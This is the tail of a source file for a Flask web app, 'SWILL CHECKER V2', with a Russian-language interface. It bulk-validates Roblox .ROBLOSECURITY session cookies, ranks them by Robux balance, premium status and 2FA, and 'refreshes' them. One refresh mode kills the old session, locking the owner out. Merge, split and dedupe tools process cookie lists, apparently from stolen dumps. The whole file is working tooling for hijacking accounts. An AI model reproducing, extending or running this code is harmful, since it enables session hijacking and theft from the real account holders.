function downloadInvalidOnly(){let invalid=massResults.filter(r=>r.status==='❌');downloadFile(invalid.map(r=>r.cookie).join('\n'),'invalid_cookies.txt')}
function downloadFullReport(){let text='';massResults.forEach(r=>{if(r.status==='✅'){text+='✅ '+r.username+' ['+r.user_id+'] | R$'+r.robux+' | '+r.created+' | Score:'+r.score+'\n'+r.cookie+'\n\n'}else{text+='❌ '+r.cookie+'\n'}});downloadFile(text,'full_report.txt')}
function downloadFile(content,filename){let blob=new Blob([content],{type:'text/plain'});let a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=filename;a.click()}

async function runFresher(){
    let cookies=document.getElementById('fresherCookies').value.trim();
    let mode=document.getElementById('fresherMode').value;
    if(!cookies){document.getElementById('fresherResult').textContent='❌ Вставьте куки!';return}
    document.getElementById('fresherResult').textContent='⏳ Обновление...';
    document.getElementById('fresherProgress').style.width='50%';
    try{
        let r=await fetch('/api/fresher',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies,mode})});
        let d=await r.json();
        document.getElementById('fresherProgress').style.width='100%';
        setTimeout(()=>document.getElementById('fresherProgress').style.width='0%',500);
        if(d.success){
            document.getElementById('fresherResult').textContent=d.only_cookies||'Нет новых куки';
            document.getElementById('fresherStats').innerHTML='✅ Успешно: '+d.success_count+' | ❌ Ошибок: '+d.fail_count;
        }else{document.getElementById('fresherResult').textContent='❌ '+(d.message||'Ошибка')}
        loadHistory();
    }catch(e){document.getElementById('fresherResult').textContent='❌ '+e.message;document.getElementById('fresherProgress').style.width='0%'}
}
function copyFresherCookies(){let text=document.getElementById('fresherResult').textContent;if(text&&text!=='Новые куки здесь...'&&text!=='⏳ Обновление...'){navigator.clipboard.writeText(text).then(()=>alert('✅ Скопировано!'))}}
function downloadFresherCookies(){let text=document.getElementById('fresherResult').textContent;if(text&&text!=='Новые куки здесь...'&&text!=='⏳ Обновление...')downloadFile(text,'refreshed_cookies.txt')}

async function loadHistory(){
    try{
        let r=await fetch('/api/history/checker');let d=await r.json();let html='';
        if(d.history&&d.history.length>0){
            d.history.slice().reverse().forEach(item=>{
                html+='<div class="history-item" onclick="this.classList.toggle(\'open\')"><div class="hdr"><span>📅 '+item.timestamp+'</span><span class="text-muted">'+(item.type==='mass'?'📦 Массовая':'🔍 Одиночная')+' | ✅ '+item.valid+'/'+item.total+'</span></div><div class="detail">'+(item.cookies?item.cookies.join('\n---\n'):'Нет данных')+(item.download_url?'\n\n📥 <a href="'+item.download_url+'" target="_blank" style="color:#7c3aed;">Скачать</a>':'')+'</div></div>';
            });
        }else{html='<div class="text-muted">📭 История пуста</div>'}
        document.getElementById('checkerHistoryList').innerHTML=html;
    }catch(e){document.getElementById('checkerHistoryList').innerHTML='<div class="text-muted">❌ Ошибка</div>'}
    try{
        let r=await fetch('/api/history/fresher');let d=await r.json();let html='';
        if(d.history&&d.history.length>0){
            d.history.slice().reverse().forEach(item=>{
                html+='<div class="history-item" onclick="this.classList.toggle(\'open\')"><div class="hdr"><span>📅 '+item.timestamp+'</span><span class="text-muted">'+(item.mode==='kill'?'💀 Сброс':'♻️ Дублирование')+' | ✅ '+item.success_count+'/'+item.refreshed_count+'</span></div><div class="detail">'+(item.cookies?item.cookies.join('\n'):'Нет данных')+(item.old_cookies?'\n\n📄 Старые куки:\n'+item.old_cookies.join('\n'):'')+'</div></div>';
            });
        }else{html='<div class="text-muted">📭 История пуста</div>'}
        document.getElementById('fresherHistoryList').innerHTML=html;
    }catch(e){document.getElementById('fresherHistoryList').innerHTML='<div class="text-muted">❌ Ошибка</div>'}
}

async function mergeCookies(){
    let files=document.getElementById('mergeFiles').files;
    if(!files||files.length<2){document.getElementById('mergeResult').textContent='❌ Минимум 2 файла';return}
    let fd=new FormData();Array.from(files).forEach(f=>fd.append('files',f));
    document.getElementById('mergeResult').textContent='⏳...';
    try{
        let r=await fetch('/api/merge-cookies',{method:'POST',body:fd});
        let d=await r.json();
        document.getElementById('mergeResult').innerHTML=d.success?'✅ '+d.total_files+' файлов | 📊 '+d.total_cookies+' куки\n📥 <a href="'+d.download_url+'" target="_blank" style="color:#7c3aed;">Скачать</a>':'❌ Ошибка';
    }catch(e){document.getElementById('mergeResult').textContent='❌ '+e.message}
}

async function splitByCount(){
    let file=document.getElementById('splitFile').files[0];
    if(!file){document.getElementById('splitResult').textContent='❌ Загрузите файл';return}
    let content=await file.text();
    let count=parseInt(document.getElementById('splitCount').value)||100;
    document.getElementById('splitResult').textContent='⏳...';
    try{
        let r=await fetch('/api/split-cookies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content,split_type:'count',count})});
        let d=await r.json();
        document.getElementById('splitResult').innerHTML=d.success?'✅ '+d.file_count+' файлов\n📥 <a href="'+d.download_url+'" target="_blank" style="color:#7c3aed;">Скачать</a>':'❌ Ошибка';
    }catch(e){document.getElementById('splitResult').textContent='❌ '+e.message}
}

async function splitByFiles(){
    let file=document.getElementById('splitFile').files[0];
    if(!file){document.getElementById('splitResult').textContent='❌ Загрузите файл';return}
    let content=await file.text();
    let num=parseInt(document.getElementById('splitCount').value)||5;
    document.getElementById('splitResult').textContent='⏳...';
    try{
        let r=await fetch('/api/split-cookies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content,split_type:'files',count:num})});
        let d=await r.json();
        document.getElementById('splitResult').innerHTML=d.success?'✅ '+d.file_count+' файлов\n📥 <a href="'+d.download_url+'" target="_blank" style="color:#7c3aed;">Скачать</a>':'❌ Ошибка';
    }catch(e){document.getElementById('splitResult').textContent='❌ '+e.message}
}

async function cleanCookies(action){
    let content=document.getElementById('cleanInput').value.trim();
    if(!content){document.getElementById('cleanResult').textContent='❌ Вставьте куки';return}
    document.getElementById('cleanResult').textContent='⏳...';
    try{
        let r=await fetch('/api/clean-cookies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content,action})});
        let d=await r.json();
        document.getElementById('cleanResult').innerHTML=d.success?'✅ '+d.original_count+' → '+d.processed_count+(d.duplicates_removed>0?' (-'+d.duplicates_removed+')':'')+'\n📥 <a href="'+d.download_url+'" target="_blank" style="color:#7c3aed;">Скачать</a>':'❌ Ошибка';
    }catch(e){document.getElementById('cleanResult').textContent='❌ '+e.message}
}

async function loadStats(){
    try{
        let r=await fetch('/api/stats');let d=await r.json();
        document.getElementById('statsResult').textContent=JSON.stringify(d,null,2);
        if(d.total_checked){
            document.getElementById('totalChecked').textContent=d.total_checked;
            document.getElementById('validCount').textContent=d.valid_count||0;
            document.getElementById('premiumCount').textContent=d.premium_count||0;
            document.getElementById('totalRobux').textContent=(d.total_robux||0).toLocaleString();
        }
    }catch(e){document.getElementById('statsResult').textContent='❌ '+e.message}
}
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/extract-preview", methods=["POST"])
def api_extract_preview():
    data = request.json or {}
    content = data.get("content", "")
    cookies = extract_cookies_from_text(content)
    return jsonify({"success": True, "count": len(cookies)})

@app.route("/api/single-check", methods=["POST"])
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie:
        return jsonify({"success": False, "message": "Кук не предоставлен"})
    
    async def check():
        async with AsyncRobloxChecker(max_workers=1) as checker:
            return await checker.quick_validate(cookie)
    
    result = run_async(check())
    
    report = format_quick_report(result)
    if result['status'] == '✅':
        report += f"\n🍪 {result['cookie']}"
    
    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO checker_history (timestamp, type, total, valid, cookies, full_data) VALUES (?, ?, ?, ?, ?, ?)",
        (datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'single', 1, 1 if result['status'] == '✅' else 0, json.dumps([report]), json.dumps([result]))
    )
    conn.commit()
    conn.close()
    
    return jsonify({"success": True, "report": report, "result": result})

@app.route("/api/mass-check", methods=["POST"])
def api_mass_check():
    data = request.json or {}
    content = data.get("content", "")
    if not content:
        return jsonify({"success": False, "message": "Контент не предоставлен"})
    
    cookies = extract_cookies_from_text(content)
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    if len(cookies) > 20000:
        cookies = cookies[:20000]
    
    logger.info(f"Starting mass check for {len(cookies)} cookies")
    
    async def check_all():
        async with AsyncRobloxChecker(max_workers=20) as checker:
            return await checker.mass_check(cookies)
    
    results = run_async(check_all())
    
    valid = [r for r in results if r['status'] == '✅']
    invalid = [r for r in results if r['status'] == '❌' or r['status'] == '🚫']
    formatted = [format_quick_report(r) for r in results]
    
    premium_count = sum(1 for r in valid if r.get('is_premium'))
    total_robux = sum(r.get('robux', 0) for r in valid)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"mass_check_{timestamp}.txt"
    filepath = os.path.join("downloads", filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(f"SWILL CHECKER V2 - ОТЧЁТ\n{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n{'='*50}\n")
        f.write(f"Всего: {len(results)} | ✅{len(valid)} | ❌{len(invalid)}\nPremium: {premium_count} | Robux: {total_robux:,}\n\n")
        for r in valid:
            f.write(f"✅ {r['username']} [{r['user_id']}] | ⏣{r['robux']:,} | {r['created']}\nScore: {r['score']} | Premium: {r['is_premium']} | 2FA: {r['has_2fa']}\n{r['cookie']}\n\n")
        if invalid:
            f.write(f"\n❌ НЕВАЛИДНЫЕ ({len(invalid)}):\n")
            for r in invalid[:100]:
                f.write(f"{r['cookie']}\n")
    
    download_url = f"/downloads/{filename}"
    
    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO checker_history (timestamp, type, total, valid, cookies, full_data, download_url) VALUES (?, ?, ?, ?, ?, ?, ?)",
        (datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'mass', len(results), len(valid), json.dumps(formatted[:50]), json.dumps([r for r in valid[:100]]), download_url)
    )
    conn.commit()
    conn.close()
    
    return jsonify({
        "success": True,
        "total": len(results),
        "valid_count": len(valid),
        "invalid_count": len(invalid),
        "premium_count": premium_count,
        "total_robux": total_robux,
        "results": formatted,
        "full_data": results,
        "download_url": download_url
    })

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    
    cookies_list = extract_cookies_from_text(raw)
    if not cookies_list:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    logger.info(f"Starting fresher for {len(cookies_list)} cookies, mode: {mode}")
    
    async def refresh_all():
        fresher = AsyncRobloxFresher(max_workers=5)
        return await fresher.mass_refresh(cookies_list, kill_old=(mode == 'kill'))
    
    results = run_async(refresh_all())
    
    success_results = [r for r in results if r.get('success', False)]
    fail_results = [r for r in results if not r.get('success', False)]
    
    only_cookies = []
    cookie_hist = []
    old_cookies = []
    
    for r in results:
        if r.get('success', False):
            username = r.get('username', '?')
            new_cookie = r.get('new_cookie', '')
            is_new = True
            if r.get('cookie'):
                old_val = r['cookie'].strip().split('.ROBLOSECURITY=')[-1].split(';')[0]
                is_new = new_cookie != old_val
            status_text = "НОВАЯ" if is_new else "БЕЗ ИЗМЕНЕНИЙ"
            cookie_hist.append(f"🟢 {username} - {status_text}")
            old_cookies.append(r.get('cookie', ''))
            if new_cookie:
                only_cookies.append(new_cookie)
        else:
            error_msg = r.get('error', 'Ошибка')[:50]
            cookie_hist.append(f"❌ {error_msg}")
    
    import sqlite3
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO fresher_history (timestamp, mode, refreshed_count, success_count, fail_count, cookies, old_cookies) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (datetime.now().strftime('%d.%m.%Y %H:%M:%S'), mode, len(only_cookies), len(success_results), len(fail_results), json.dumps(cookie_hist[:30]), json.dumps(old_cookies[:30]))
        )
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"DB error: {e}")
    
    return jsonify({
        "success": True,
        "refreshed_count": len(only_cookies),
        "success_count": len(success_results),
        "fail_count": len(fail_results),
        "only_cookies": '\n'.join(only_cookies) if only_cookies else ''
    })

@app.route("/api/history/checker")
def api_history_checker():
    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT timestamp, type, total, valid, cookies, full_data, download_url FROM checker_history ORDER BY id DESC LIMIT 50")
    rows = cursor.fetchall()
    conn.close()
    history = []
    for row in rows:
        history.append({
            "timestamp": row[0],
            "type": row[1],
            "total": row[2],
            "valid": row[3],
            "cookies": json.loads(row[4]) if row[4] else [],
            "full_data": json.loads(row[5]) if row[5] else [],
            "download_url": row[6] or ""
        })
    return jsonify({"history": history})

@app.route("/api/history/fresher")
def api_history_fresher():
    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT timestamp, mode, refreshed_count, success_count, fail_count, cookies, old_cookies FROM fresher_history ORDER BY id DESC LIMIT 50")
    rows = cursor.fetchall()
    conn.close()
    history = []
    for row in rows:
        history.append({
            "timestamp": row[0],
            "mode": row[1],
            "refreshed_count": row[2],
            "success_count": row[3],
            "fail_count": row[4],
            "cookies": json.loads(row[5]) if row[5] else [],
            "old_cookies": json.loads(row[6]) if row[6] else []
        })
    return jsonify({"history": history})

@app.route("/api/stats")
def api_stats():
    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM checker_history")
    total_checks = (cursor.fetchone())[0]
    cursor.execute("SELECT SUM(valid) FROM checker_history")
    total_valid = (cursor.fetchone())[0] or 0
    cursor.execute("SELECT COUNT(*) FROM checker_history WHERE full_data LIKE '%is_premium\": true%'")
    premium_count = (cursor.fetchone())[0]
    cursor.execute("SELECT full_data FROM checker_history ORDER BY id DESC LIMIT 10")
    rows = cursor.fetchall()
    conn.close()
    total_robux = 0
    for row in rows:
        data = json.loads(row[0]) if row[0] else []
        for item in data[:50]:
            if isinstance(item, dict) and item.get('robux'):
                total_robux += item.get('robux', 0)
    return jsonify({
        "total_checked": total_checks,
        "valid_count": total_valid,
        "premium_count": premium_count,
        "total_robux": total_robux,
        "timestamp": datetime.now().strftime('%d.%m.%Y %H:%M:%S')
    })

@app.route("/api/merge-cookies", methods=["POST"])
def api_merge_cookies():
    if 'files' not in request.files:
        return jsonify({"success": False})
    files = request.files.getlist('files')
    if len(files) < 2:
        return jsonify({"success": False, "message": "Минимум 2 файла"})
    contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    merged = merge_cookie_files(contents)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"merged_{timestamp}.txt"
    with open(os.path.join("downloads", filename), 'w', encoding='utf-8') as f:
        f.write(merged)
    total = len([l for l in merged.split('\n') if l])
    return jsonify({"success": True, "total_files": len(files), "total_cookies": total, "download_url": f"/downloads/{filename}"})

@app.route("/api/split-cookies", methods=["POST"])
def api_split_cookies():
    data = request.json or {}
    content = data.get("content", "")
    split_type = data.get("split_type", "count")
    count = data.get("count", 100)
    
    if not content or not content.strip():
        return jsonify({"success": False, "message": "Контент пуст"})
    if count <= 0:
        return jsonify({"success": False, "message": "Количество должно быть > 0"})
    
    if split_type == "count":
        files = split_cookies_by_count(content, count)
    else:
        files = split_cookies_by_files(content, count)
    
    if not files:
        return jsonify({"success": False, "message": "Нет куки для разделения"})
    
    if len(files) == 1:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"split_{timestamp}.txt"
        with open(os.path.join("downloads", filename), 'w', encoding='utf-8') as f:
            f.write(files[0])
        return jsonify({"success": True, "file_count": 1, "download_url": f"/downloads/{filename}"})
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, fc in enumerate(files, 1):
            if fc.strip():
                zf.writestr(f"part_{i}.txt", fc)
    
    if zip_buffer.getbuffer().nbytes == 0:
        return jsonify({"success": False, "message": "Нет данных для архива"})
    
    zip_buffer.seek(0)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f"split_{timestamp}.zip"
    with open(os.path.join("downloads", archive_name), 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    return jsonify({"success": True, "file_count": len(files), "download_url": f"/downloads/{archive_name}"})

@app.route("/api/clean-cookies", methods=["POST"])
def api_clean_cookies():
    data = request.json or {}
    content = data.get("content", "")
    action = data.get("action", "deduplicate")
    if not content:
        return jsonify({"success": False})
    orig = [l for l in content.split('\n') if l.strip()]
    processed = remove_duplicates(content) if action == "deduplicate" else clean_cookies(content)
    proc = [l for l in processed.split('\n') if l.strip()]
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"cleaned_{timestamp}.txt"
    with open(os.path.join("downloads", filename), 'w', encoding='utf-8') as f:
        f.write(processed)
    return jsonify({
        "success": True,
        "original_count": len(orig),
        "processed_count": len(proc),
        "duplicates_removed": len(orig) - len(proc),
        "download_url": f"/downloads/{filename}"
    })

@app.route("/downloads/<filename>")
def download_file(filename):
    return send_from_directory("downloads", filename, as_attachment=True)

async def main():
    await init_db()
    logger.info("Database initialized")
    app.run(debug=False, host='0.0.0.0', port=5000, threaded=True)

if __name__ == "__main__":
    asyncio.run(main())
